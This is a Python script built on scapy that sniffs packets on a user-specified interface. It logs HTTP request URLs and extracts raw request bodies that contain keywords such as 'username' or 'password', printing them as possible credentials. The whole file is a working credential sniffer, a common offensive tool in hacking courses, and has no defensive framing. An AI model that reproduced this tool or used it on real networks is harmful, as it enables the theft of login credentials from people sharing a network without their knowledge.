#!/usr/bin/env python3

import argparse
import scapy.all as scapy
from scapy.layers import http


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on.")
    options = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")

    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)  #filter=[tcp, ftp, port 21, arp]

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if (packet.haslayer(scapy.Raw)):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load.decode():
                return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> "+url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password: " + login_info.decode() + "\n\n")




options = get_arguments()

sniff(options.interface)